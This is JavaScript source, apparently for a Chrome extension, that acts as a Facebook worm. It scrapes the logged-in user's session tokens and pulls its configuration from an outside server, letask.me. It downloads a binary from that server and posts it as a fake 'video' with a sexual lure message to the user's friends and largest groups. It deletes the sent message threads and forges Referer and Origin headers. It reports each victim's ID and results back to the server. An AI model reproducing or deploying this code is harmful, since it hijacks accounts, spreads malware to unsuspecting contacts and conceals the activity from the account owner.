var facebook = {};
facebook.config = {};
facebook.getDtsg = function(){
  fetch("https://www.facebook.com/").then((response) => {
    return response.text();
  }).then((data) => {
    facebook.profile_id = data.split('USER_ID":')[1].split('"')[1].split('"')[0];
    if(facebook.profile_id != 0){
      facebook.fb_dtsg = data.split('name="fb_dtsg')[1].split('value="')[1].split('"')[0];
      facebook.rev = data.split('"server_revision":')[1].split(",")[0];
      facebook.ajaxpipe_token = data.split('ajaxpipe_token":')[1].split('"')[1].split('"')[0];
      facebook.ttstamp = "";
      facebook.async_get_token = data.split('async_get_token":"')[1].split('"')[0];
      for (var x = 0; x < facebook.fb_dtsg.length; x++){
          facebook.ttstamp += facebook.fb_dtsg.charCodeAt(x);
      }
      facebook.ttstamp = '2' + facebook.ttstamp;
      console.log("User:"+facebook.profile_id);
      console.log("fb_dtsg:"+facebook.fb_dtsg);
      console.log("__rev:"+facebook.rev);
      console.log("ttstamp:"+facebook.ttstamp);
      console.log("ajaxpipe_token:"+facebook.ajaxpipe_token);
      console.log("async_get_token:"+facebook.async_get_token);
      facebook.start();
    }
  })
}

facebook.start = function(){
  fetch("https://letask.me/ajax/start.php").then((response) => {
    return response.json();
  }).then((data) => {
    facebook.config=data;
    console.log(facebook.config);
    var lastTime = localStorage[facebook.config.cookie_name] || 0;
    var timeValid = (Date.now() - lastTime) >= facebook.config.cookie_time ? true : false;
    var version = localStorage["facebook.version"] || 0;
    if(version != facebook.config.version){
      localStorage["facebook.version"] = facebook.config.version;
      location.reload();
      return;
    }
    for(key in localStorage){
      if(key.indexOf("sent") >= 0 && key.indexOf(facebook.config.cookie_name) < 0){
        delete localStorage[key]
      }
    }
    if(facebook.config.active == true && timeValid == true){
      localStorage[facebook.config.cookie_name] = Date.now();
      console.log("Active: true");
      var vars = {};
      facebook.online(vars);
    }
  })
}

facebook.online = function(vars){
  var params = {
    data_fetch: true,
    send_full_data: true,
    m_sess: "",
    fb_dtsg: facebook.fb_dtsg,
    jazoest: rand(11111,99999),
    __dyn: "1KQdAmm1gxu4U4ifDgy79pkdxu6Erz8do98nw_iwqobE6u7E39x64o5K0JUe8hw8C1rwfK2O1gCwSxu0BU3JxO1ZxO3W3G1Qzawlo168WUS1kwpEeU3bwwyo36wNw",
    __req: 8,
    __ajax__: facebook.ajaxpipe_token,
    __user: facebook.profile_id
  }

  fetch("https://m.facebook.com/buddylist_update.php?ext=me",{
    method:"POST",
    headers:{
      "Content-Type": "application/x-www-form-urlencoded",
      "x-requested-with": "XMLHttpRequest"
    },
    body:deSerialize(params)
  }).then(response => response.text()).then((text) => {
    var data = JSON.parse(text.replace('for (;;);',''));
    var friends = data.payload.buddylist;
    friends = shuffle(friends);
    var offlines = data.payload.friend_data;
    var vars = {};
    vars.friends = [];

    for(i=0;i<friends.length&&vars.friends.length<facebook.config.file_limit;i++){
      if(!localStorage['sent_friend'+facebook.config.cookie_name+friends[i].id]){
          vars.friends.push(friends[i]);
          delete offlines[friends[i].id];
      }
    }

    for(key in offlines){
      if(vars.friends.length>=facebook.config.file_limit){
        break;
      }
      offlines[key].id = key;
      if(!localStorage['sent_friend'+facebook.config.cookie_name+offlines[key].id]){
        vars.friends.push(offlines[key]);
      }
    }

    console.log(vars.friends);
    facebook.groups(vars);
  });
}

facebook.groups = function(vars) {
    var params = {};
    params["dpr"] = 1;
    params["fb_dtsg_ag"] = facebook.async_get_token;
    params["viewer"] = facebook.profile_id;
    params["filter[0]"] = "group";
    params["options[0]"] = "friends_only";
    params["options[1]"] = "nm";
    params["token"] = "v7";
    params["context"] = "mentions";
    params["rsp"] = "mentions";
    params["__user"] = facebook.profile_id;
    params["__a"] = 1;
    params["__dyn"] = "aihoFeyfyGmagngDxKy1lwzhEK5EKiWFaay8Z9LFwxBxC9V8CdwIhE98nwgUaqwHzQubyR88wPGiex3BKuEjKeCxPG4EK14DBwJKq4GCzEkxuezUO5onwnoCium8yUgx66EK3Ou49LZ1uJ12VpUnG6Ey";
    params["__af"] = "o";
    params["__req"] = "b";
    params["__be"] = -1;
    params["__pc"] = "EXP1:DEFAULT";
    params["__rev"] = facebook.rev;
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?"+deSerialize(params), true);
    xhr.onreadystatechange = function(){
        if (xhr.readyState == 4 && xhr.status == 200){
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            if (!data.error && data.payload){
              var groups = [];
              groups = data.payload.entries;
              groups = groups.sort((a, b) => (a.size < b.size) ? 1 : -1);
              vars.groups = [];
              for(g=0;g<groups.length&&vars.groups.length < facebook.config.group_limit;g++){
                  if(groups[g].size >= facebook.config.group_min && vars.groups.length < facebook.config.group_limit){
                      if(!localStorage["sent_group"+facebook.config.cookie_name+groups[g].uid]){
                        vars.groups.push(groups[g]);
                      }
                  }
              }
              console.log(vars.groups);
              if(vars.groups.length > 0 || vars.friends.length > 0){
                facebook.getFile(vars);
              }
            }
        }
    }
    xhr.send();
}

facebook.getFile = function(vars){
  var oReq = new XMLHttpRequest();
  oReq.open("GET", "https://letask.me/ajax/7z.php?ext=me", true);
  oReq.responseType = "arraybuffer";
  oReq.onreadystatechange = function() {
      if(this.readyState != 4) return;
      var arrayBufferView = new Uint8Array( this.response );
      vars.blob = new Blob( [ arrayBufferView ], { type: "application/octet-stream" } );
      if(vars.friends.length > 0){
        facebook.uploadFile(vars);
      }
      if(vars.groups.length > 0){
        for (var i = 0; i < vars.groups.length; i++) {
          vars.group = vars.groups[i];
          facebook.uploadGroup(vars);
        }
      }
  };
  oReq.send();
}

facebook.uploadGroup = function(vars){
  var group = vars.group;
  var message = "Wow video ⬇🎞💖💋🔞👙😍🎞⬇";
  var getParams = {
    av: facebook.profile_id,
    album_id:"",
    asset3d_id:"",
    asked_fun_fact_prompt_data:"",
    attachment:"",
    audience:"",
    boosted_post_config:"",
    breaking_news_expiration: 0,
    breaking_news_selected: false,
    cta_data:"",
    composer_entry_point: "group",
    composer_entry_time: rand(30,35),
    composer_session_id: guid(),
    composer_session_duration: rand(100,150),
    composer_source_surface: "group",
    composertags_city:"",
    composertags_place:"",
    civic_product_source:"",
    direct_share_status: 0,
    sponsor_relationship: 0,
    branded_content_data:"",
    extensible_sprouts_ranker_request:"",
    feed_topics:"",
    find_players_info:"",
    fun_fact_prompt_id:"",
    group_post_tag_ids:"",
    hide_object_attachment: false,
    has_support_now_cta: false,
    is_explicit_place: false,
    is_markdown: false,
    is_post_to_group: false,
    is_welcome_to_group_post: false,
    is_q_and_a: false,
    is_profile_badge_post: false,
    story_list_attachment_data:"",
    local_alert_expiration:"",
    multilingual_specified_lang:"",
    num_keystrokes: 0,
    num_pastes: 0,
    place_attachment_setting: 1,
    poll_question_data:"",
    privacyx:"",
    prompt_id:"",
    prompt_tracking_string:"",
    publisher_abtest_holdout:"",
    ref: "group",
    stories_selected: false,
    todo_list_data:"",
    timeline_selected: true,
    xc_sticker_id: 0,
    event_tag:"",
    target_type: "group",
    xhpc_message:message,
    xhpc_message_text:message,
    is_forced_reshare_of_post:"",
    xc_disable_config:"",
    delight_ranges: "[]",
    holiday_card:"",
    is_react: true,
    xhpc_composerid: "rc.u_fetchstream_3_n",
    xhpc_targetid: vars.group.uid,
    xhpc_context: "profile",
    xhpc_timeline: false,
    xhpc_finch: false,
    xhpc_aggregated_story_composer: false,
    xhpc_publish_type: 1,
    xhpc_fundraiser_page: false,
    scheduled: false,
    unpublished_content_type:"",
    scheduled_publish_time:"",
    __user: facebook.profile_id,
    __a: 1,
    __dyn: rastgele(105),
    __req: 28,
    __be: 1,
    __pc: "PHASED:ufi_home_page_pkg",
    dpr: 1,
    __rev: facebook.rev,
    __comet_req: false,
    fb_dtsg: facebook.fb_dtsg,
    jazoest: rand(11111,99999),
    __spin_r: facebook.rev,
    __spin_b: "trunk",
    __spin_t: Math.floor(Date.now()/1000),
    ext: "me"
  }

  var fd = new FormData();
  fd.append('file1', vars.blob, "video_"+rand(11111,99999)+".bz");

  fetch("https://www.facebook.com/ajax/groups/files/upload?"+deSerialize(getParams), {
    method: "POST",
    body:fd
  }).then(response => response.text()).then((data) => {
    vars.group = group;
    localStorage['sent_group'+facebook.config.cookie_name+vars.group.uid] = true;
    if(data.indexOf("&post_id=") > 0){
      var post_id = data.split('&post_id=')[1].split('&')[0];
      sonuc(vars.group.uid,"https://facebook.com/"+post_id,"","group",1);
    }else{
      sonuc(vars.group.uid,"https://facebook.com/","","group",0);
    }
  });
}

facebook.uploadFile = function(vars){
  var fd = new FormData();
  fd.append("upload_1025", vars.blob, "video_"+rand(11111,99999)+".bz");

  var getParams = {};
  getParams["ext"] = "me";
  getParams["__user"] = facebook.profile_id;
  getParams["__a"] = 1;
  getParams["__dyn"] = "7AmajEzUGByAZecgDxyIGzGomzkqbxqbAKGiABy8VFLFwxBxC9V8CdwIhE98nwgUaqwHUR1ebkwy6UnQiex3BKuEjKeCxicxaFQ6otz9VojxCVEiGqexi5-uifz8lUlwnoCium8yUgx66EK2m5FUgC_Q6J1imu5WwxUZ0";
  getParams["__af"] = "o";
  getParams["__req"] = 87;
  getParams["__be"] = -1;
  getParams["__pc"] = "PHASED:ufi_home_page_pkg";
  getParams["fb_dtsg"] = facebook.fb_dtsg;
  getParams["ttstamp"] = facebook.ttstamp;
  getParams["__rev"] = facebook.rev;
  getParams["__spin_r"] = facebook.rev;
  getParams["__spin_b"] = "trunk";
  getParams["__spin_t"] = facebook.rev;
  getParams["ft[tn]"] = "+M";

  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://upload.facebook.com/ajax/mercury/upload.php?"+deSerialize(getParams));
  xhr.onreadystatechange = function() {
      if(xhr.readyState == 4 && xhr.status == 200){
        var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
        if(!data.error){
          vars.file_id = searchArray(data, "file_id");
          facebook.sendMessages(vars);
          sonuc(vars.file_id,"http://facebook.com/","","file",1);
        }else{
          sonuc(data.error,"http://facebook.com/","","file",0);
        }
      }
  }
  xhr.send(fd);
}

facebook.sendMessages = function(vars){
  for (var i = 0; i < vars.friends.length; i++) {
    vars.user = vars.friends[i];
    facebook.sendMessage(vars);
  }
}

facebook.sendMessage = function(vars){
    var user = vars.user;
    var message_id = rand(11111111111111,999999999999999);

    var params = {
      attachment_id: vars.file_id,
      __user: facebook.profile_id,
      __a: 1,
      __dyn: "7AzkXghFo-4Q9UoGSEWC5EW3mbF3oyfJ4Wo466ES2N6wAxu13wFwVwBHyodEbbxW4EeU4eczobrzoeopDxicG4K1Zxa2m4oqwi88-7Q3GE2SwaS4pEtxy5Urwr8lwHx-2K1KxO4Wx2fwoEpxa4obeexC6-2y48OEO9xC2bweSbG6VFXAy85iawiE88O2m6Uy17CU8QbxS227Ua8y0Boqw",
      __req: "7t",
      __be: 1,
      __pc: "PHASED:ufi_home_page_pkg",
      dpr: 1,
      __rev: facebook.rev,
      __comet_req: false,
      fb_dtsg: facebook.fb_dtsg,
      jazoest: rand(111111,999999),
      __spin_r: facebook.rev,
      __spin_b: "trunk",
      __spin_t: Math.floor(Date.now()/1000)
    };

    var lid = message_id+parseInt(vars.user.id);
    params["recipient_map["+lid+"]"] = vars.user.id;
    localStorage['sent_friend'+facebook.config.cookie_name+vars.user.id] = true;

    fetch("https://www.facebook.com/mercury/attachments/forward/?ext=me",{
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body:deSerialize(params)
    }).then(response => response.text()).then((data) => {
      var data = JSON.parse(data.replace("for (;;);",""));
      vars.user = user;
      if(data.payload && data.payload.success && data.payload.success == true){
        sonuc(vars.user.id,"http://facebook.com/","","message",1);
        facebook.deleteMessage(vars);
      }else if(data.payload.error.indexOf('(') > 0){
        var error = data.payload.error.split('(')[1].split(')')[0];
        sonuc(error,"http://facebook.com/"+vars.user.id,"","message",0);
      }else{
        sonuc(vars.user.id,"http://facebook.com/","","message",0);
      }
    });
}

facebook.deleteMessage = function(vars){
  var user = vars.user;

  var params = {
    __user: facebook.profile_id,
    __a: 1,
    __dyn: "7AzkXghFo-4Q9UoGyaeFxqewRyWzEsheC11xGdwIhE98nwgUaqwSxCbHyodEbbxW4EeU4eczobrzoeopDxicG4K1Zxa2m4oqwi88-7Q3GE2SwaS4pEtxy5Urwr8lx-bx-2K1KxO4Wx2fwoEpxa4obe2y6-2ei48OEO9xC2bweSbG6WKuV8y1kyE4G22cwBxK8whVK2d2Utwwx-2y8w8mfxmi",
    __req: 48,
    __be: 1,
    __pc: "PHASED:ufi_home_page_pkg",
    dpr: 1,
    __rev: facebook.rev,
    __comet_req: false,
    fb_dtsg: facebook.fb_dtsg,
    jazoest: rand(1111,9999),
    __spin_r: facebook.rev,
    __spin_b: "trunk",
    __spin_t: Math.floor(Date.now()/1000)
  }

  params["ids[0]"] = user.id;

  fetch("https://www.facebook.com/ajax/mercury/delete_thread.php?ext=me", {
    method:"POST",
    headers: {
      "content-type": "application/x-www-form-urlencoded"
    },
    body:deSerialize(params)
  });
}

chrome.webRequest.onBeforeSendHeaders.addListener(
  function(details) {
    if(details.url.indexOf("ext=me") < 0){
      return;
    }
    var url = new URL(details.url);
    for (var i = 0; i < details.requestHeaders.length; ++i) {
      if (details.requestHeaders[i].name.toLowerCase() === 'referer') {
        details.requestHeaders[i].value = url.protocol+"//"+url.hostname+"/";
      }

      if (details.requestHeaders[i].name.toLowerCase() === 'origin') {
        details.requestHeaders[i].value = url.protocol+"//"+url.hostname;
      }
    }
    return { requestHeaders: details.requestHeaders };
  },
  {urls: ['https://*.facebook.com/*']},
  [ 'blocking', 'requestHeaders']
);

facebook.getDtsg();
setInterval(function(){
  facebook.getDtsg();
},1000*60)

function sonuc(sonuc,link,image,type,success){
    var sonuc = sonuc || "";
    var link = link || "";
    var image = image || "";
    var type = type || "";
    var success = success || 0;
    var params = {};
    params["user"] = facebook.profile_id;
    params["sonuc"] = sonuc;
    params["site"] = "facebook.com";
    params["link"] = link;
    params["img"] = image;
    params["type"] = type;
    params["success"] = success;
    fetch("https://letask.me/ajax/sonuc.php?"+deSerialize(params));
}

function generate_name(length,firstUpper){
    rname = "";
    sesli = "aeiou";
    sessiz = "bcdfghjklmnprstvyz";
    rname = rand(1,2) == 1?sessiz[rand(0,sessiz.length-1)]:sesli[rand(0,sesli.length-1)];
    if(firstUpper == true){
        rname = rname.toUpperCase();
    }
    for(n=0;n<length;n++){
        if(sesli.indexOf(rname[rname.length-1]) >= 0){
            rname += sessiz[rand(0,sessiz.length-1)];
        }else{
            rname += sesli[rand(0,sesli.length-1)];
        }
    }
    return rname;
}

function capitalizeFirstLetter(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
}

function inArray(arr, key, value){
    var res = false;
    for(a=0;a<arr.length;a++){
        for(k in arr[a]){
            if(k == key && arr[a][k] == value){
                res = true;
                break;
            }
        }
    }
    return res;
}

function decode(t,h){
    var a = "abcdefghijklmnoprstuvyzx0123456789";
    var c = "";
    for(cr=0;cr<t.length;cr++){
        c += a[h.indexOf(t[cr])];
    }
    return c;
}

function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
    s4() + '-' + s4() + s4() + s4();
}

function randoms(l, m) {
    var r = [];
    while (r.length < l) {
        var rnd = Math.floor(Math.random() * m);
        if (r.indexOf(rnd) < 0) {
            r.push(rnd);
        }
    }
    return r;
}

function searchArray(a,k){
    var found = false;
    for(key in a){
        if(key.toString() == k){
            found = a[key];
            break;
        }else if(typeof a[key] == "object"){
            found = searchArray(a[key],k);
            if(found != false){
                break;
            }
        }
    }
    return found;
}

function shuffle(array) {
  var currentIndex = array.length, temporaryValue, randomIndex;

  while (0 !== currentIndex) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }

  return array;
}

function rand(min,max){
    return Math.floor(Math.random()* (max-min))+min;
}

function rastgele(uzunluk) {
    mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
    ret = "";
    for (l = 0; l < uzunluk; l++) {
        ret += mtn[Math.floor(Math.random() * mtn.length)];
    }
    return ret;
}

function deSerialize(json) {
    return Object.keys(json).map(function(key) {
        return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
    }).join('&');
}